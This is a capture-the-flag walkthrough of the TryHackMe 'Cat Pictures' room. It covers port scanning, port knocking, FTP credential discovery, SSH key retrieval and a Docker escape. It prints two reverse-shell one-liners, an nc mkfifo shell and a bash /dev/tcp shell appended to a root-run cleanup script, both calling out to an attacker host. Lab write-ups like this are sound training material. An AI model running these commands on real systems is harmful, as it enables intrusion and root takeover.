---
description: https://tryhackme.com/room/catpictures
---

# Cat Pictures

## Nmap

```
sudo nmap 10.10.217.166 -p- -sS -sV

PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
53/tcp   filtered domain
2375/tcp filtered docker
4420/tcp open     nvm-express?
8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
```

Interestingly `Nmap` shows that port 21 is filtered which we can take note of. Running netcat against port 4420 appears to show a login for a shell. Unfortunately I was unable to proceed attempting common passwords.

![](<../../../.gitbook/assets/image (1799).png>)

Over on port 8080 we have a landing page for phpBB forums.

![](<../../../.gitbook/assets/image (1797).png>)

From here I tried to register an account and was unsuccessful regarding an error regarding 'Invalid MX domain'.

Looking at the only thread created by the site admin we see a potential reference to port knocking.

![](<../../../.gitbook/assets/image (1798).png>)

We can perform port knocking as per the bash command below in order to use Nmap to 'knock' the ports in sequence. After completion scanning the ports on the target again should open one of them.

```bash
for i in 1111 2222 3333 4444;do nmap -Pn -p $i --host-timeout 201 --max-retries 0 <IP>; done
```

```bash
sudo nmap 10.10.217.166 -F  -sS    

PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
53/tcp   filtered domain
8080/tcp open     http-proxy
```

We can now connect to the FTP.

![](<../../../.gitbook/assets/image (1800).png>)

Reading the contents of note.txt we are given the internal shell password.

![](<../../../.gitbook/assets/image (1801).png>)

After entering the password over `netcat` to port 4420 we now appear to have access to the target system.

![](<../../../.gitbook/assets/image (1802).png>)

From here I checked the installed software under /bin/ and found `netcat` to be installed. As such I opted to get a more usable `netcat` reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <Port> >/tmp/f
```

![](<../../../.gitbook/assets/image (1803).png>)

From here checking home directory contents we see the user catlover has a file called runme in the home directory.

![](<../../../.gitbook/assets/image (1804).png>)

When running the file we are asked for a password to proceed. I tried the shell service password which was incorrect. From here I run cat on the file to view the contents and noticed the string 'rebecca' before the output asking for a password.

![](<../../../.gitbook/assets/image (1805).png>)

Entering rebecca password. we are then given the message '_Welcome, catlover! SSH key transfer queued!_'.

![](<../../../.gitbook/assets/image (1806).png>)

After a short while id\_rsa will appear in the users directory.

![](<../../../.gitbook/assets/image (1807).png>)

After transferring the contents of the id\_rsa to my attacking machine I then used the following `chmod` command to set the correct permissions.

```bash
chmod 600 cat_rsa
```

We are then able to `SSH` in as the known user on the target machine.

![](<../../../.gitbook/assets/image (1809).png>)

We appear to be root. However, checking the machine hostname of 7546fa2336d6and the existence of the .dockerenv file in '/' we are more than likely in a docker container.

![](<../../../.gitbook/assets/image (1810).png>)

From here I noticed a file in /opt/clean.sh. Viewing the contents this looks like it is removing the contents of the /tmp/ directory. I placed some files in the directory and waited. After a short while the files had been removed from the directory.

As a result I placed a bash reverse shell into clean.sh

```bash
echo '0<&196;exec 196<>/dev/tcp/10.11.39.30/4422; sh <&196 >&196 2>&196' >> clean.sh
```

![](<../../../.gitbook/assets/image (1811).png>)

Where we soon recieve a reverse shell as root outside the docker container.

![](<../../../.gitbook/assets/image (1812).png>)
